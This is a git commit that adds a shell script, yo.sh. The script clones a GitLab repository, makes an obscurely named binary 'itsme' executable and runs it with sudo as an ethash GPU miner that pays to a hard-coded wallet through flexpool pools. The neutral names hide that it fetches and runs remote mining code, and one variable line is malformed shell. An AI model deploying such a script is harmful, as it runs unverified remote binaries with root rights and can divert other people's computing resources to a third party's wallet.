5771650de8477a19e7e805cdbe50bbc1e47dfca0
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-04-19 12:31:55 +0700

    Update and rename yaa.sh to yo.sh

---
+++ yo.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+sudo apt update
+sudo apt-get install zip unzip
+sudo apt install screen -y
+screen -dmS sahuman.sh 65 75
+sudo git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
+cd sainame127
+$r=gpu_name=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
+WORKER=$(echo $(shuf -i 19141-34464563 -n 1))
+chmod +x itsme
+sudo ./itsme -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p stratum+tcp://eth-sg.flexpool.io:4444 stratum+tcp://eth-hk.flexpool.io -r $r  --nvidia 1
